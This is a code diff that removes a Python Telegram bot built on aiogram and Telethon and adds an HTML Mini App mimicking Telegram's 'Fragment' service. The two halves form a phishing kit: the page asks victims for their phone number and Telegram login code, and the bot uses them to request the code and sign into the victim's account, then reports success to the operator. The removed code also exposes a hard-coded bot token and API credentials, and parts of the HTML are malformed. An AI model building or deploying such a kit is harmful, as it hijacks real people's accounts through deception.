@@ -1,73 +1,59 @@
-import json, asyncio, logging
-from aiogram import Bot, Dispatcher, types, F
-from aiogram.filters import Command
-from aiogram.types import WebAppInfo, MenuButtonWebApp
-from telethon import TelegramClient
-
-# --- ТВОИ ДАННЫЕ ---
-BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"
-API_ID = 28687552
-API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
-ADMIN_ID = 174415647
-WEB_APP_URL = "https://dreiner.onrender.com" 
-
-bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher()
-# Словарь для хранения активных сессий (чтобы не терять связь с номером)
-active_sessions = {}
-
-@dp.message(Command("start"))
-async def cmd_start(message: types.Message):
-    if message.from_user.id != ADMIN_ID: return
-    # Устанавливаем кнопку Fragment в меню
-    await bot.set_chat_menu_button(
-        chat_id=message.chat.id,
-        menu_button=MenuButtonWebApp(text="Fragment", web_app=WebAppInfo(url=WEB_APP_URL))
-    )
-    await message.answer("🚀 **Панель Fragment готова!**\nНажми на кнопку в меню слева, чтобы открыть Mini App.")
-
-# ОБРАБОТКА ДАННЫХ ИЗ MINI APP (когда нажал "Далее")
-@dp.message(F.web_app_data)
-async def handle_web_app_data(message: types.Message):
-    data = json.loads(message.web_app_data.data)
-    action = data.get("action")
-    phone = data.get("phone")
-    
-    if action == "send_code":
-        await message.answer(f"📩 **Запрашиваю код для:** `{phone}`...")
-        
-        # Создаем клиента Telethon для этого номера
-        client = TelegramClient(f'sess_{phone}', API_ID, API_HASH)
-        active_sessions[phone] = client
-        
-        await client.connect()
-        try:
-            # ВОТ ЭТА КОМАНДА ЗАСТАВЛЯЕТ TELEGRAM ВЫСЛАТЬ КОД ПОЛЬЗОВАТЕЛЮ
-            await client.send_code_request(phone)
-            await message.answer(f"✅ **Код успешно отправлен!**\nПользователь `{phone}` должен получить его прямо сейчас.")
-        except Exception as e:
-            await message.answer(f"❌ **Ошибка отправки:**\n`{str(e)}`")
-            await client.disconnect()
-
-    elif action == "login_attempt":
-        code = data.get("code")
-        client = active_sessions.get(phone)
-        
-        if not client:
-            await message.answer("❌ Ошибка: Сессия не найдена. Введите номер заново.")
-            return
-
-        await message.answer(f"⚙️ **Вхожу в аккаунт `{phone}`...**")
-        try:
-            # Входим в аккаунт, используя полученный из Mini App код
-            await client.sign_in(phone, code)
-            await message.answer(f"🔓 **ВХОД ВЫПОЛНЕН!**\nАккаунт `{phone}` успешно авторизован.")
-        except Exception as e:
-            await message.answer(f"❌ **Ошибка входа:**\n`{str(e)}`")
-
-async def main():
-    await dp.start_polling(bot)
-
-if __name__ == '__main__':
-    logging.basicConfig(level=logging.INFO)
-    asyncio.run(main())
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script src="https://telegram.org"></script>
+    <script src="https://unpkg.com"></script>
+    <style>
+        body { 
+            background-color: #ffffff; 
+            /* ВШИТЫЙ УЗОР TELEGRAM */
+            background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org fill='none' fill-rule='evenodd'%3E%3Cg fill='%233390ec' fill-opacity='0.08'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+            font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; 
+        }
+        .container { width: 90%; max-width: 400px; text-align: center; background: rgba(255, 255, 255, 0.98); padding: 30px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
+        .tg-logo { width: 80px; height: 80px; margin-bottom: 20px; }
+        h2 { font-size: 26px; font-weight: 700; margin-bottom: 10px; }
+        p { font-size: 15px; color: #707579; margin-bottom: 25px; }
+        select, input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #dfe1e5; background: #f4f4f5; font-size: 18px; box-sizing: border-box; outline: none; text-align: center; margin-bottom: 10px; }
+        button { width: 100%; padding: 16px; background: #3390ec; color: #ffffff; border: none; border-radius: 12px; font-weight: 600; font-size: 17px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="tg-logo" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#3390EC""")/>><path d="M175.987 80.8159L158.336 164.103C157.007 169.967 153.551 171.428 148.621 168.662L121.73 148.835L108.756 161.314C107.319 162.751 106.12 163.962 103.354 163.962L105.289 136.502L155.26 91.2461C157.432 89.313 154.784 88.2384 151.884 90.1714L89.9882 129.141L63.3853 120.824C57.5996 119.016 57.4789 115.031 64.5925 112.254L168.607 72.1384C173.436 70.3274 177.662 73.2088 175.987 80.8159Z" fill="white""")/>></svg>
+        <h2 id="title">Fragment</h2>
+        <p id="desc">Введите номер для авторизации</p>
+        <div id="step1">
+            <select id="country" onchange="changeCountry()">
+                <option value="RU" data-mask="+{7} (000) 000-00-00">🇷🇺 Россия (+7)</option>
+                <option value="AZ" data-mask="+{994} (00) 000-00-00">🇦🇿 Азербайджан (+994)</option>
+                <option value="OTHER" data-mask="+{000000000000}">🌍 Другая страна...</option>
+            </select>
+            <input type="tel" id="phoneInput">
+        </div>
+        <button id="btn">Далее</button>
+    </div>
+    <script>
+        let tg = window.Telegram.WebApp; tg.expand();
+        let step = 1; let mask; let phone = "";
+        function initMask(p) { if (mask) mask.destroy(); mask = IMask(document.getElementById('phoneInput'), { mask: p, lazy: false }); }
+        function changeCountry() { initMask(document.getElementById('country').options[document.getElementById('country').selectedIndex].getAttribute('data-mask')); }
+        initMask("+{7} (000) 000-00-00");
+        document.getElementById('btn').onclick = function() {
+            if (step === 1) {
+                phone = "+" + mask.unmaskedValue;
+                tg.sendData(JSON.stringify({ "action": "send_code", "phone": phone }));
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('desc').innerText = "Введите код из Telegram";
+                mask.destroy(); document.getElementById('phoneInput').value = "";
+                document.getElementById('btn').innerText = "Войти"; step = 2;
+            } else {
+                tg.sendData(JSON.stringify({ "action": "login_attempt", "code": document.getElementById('phoneInput').value, "phone": phone }));
+                tg.close();
+            }
+        };
+    </script>
+</body>
+</html>
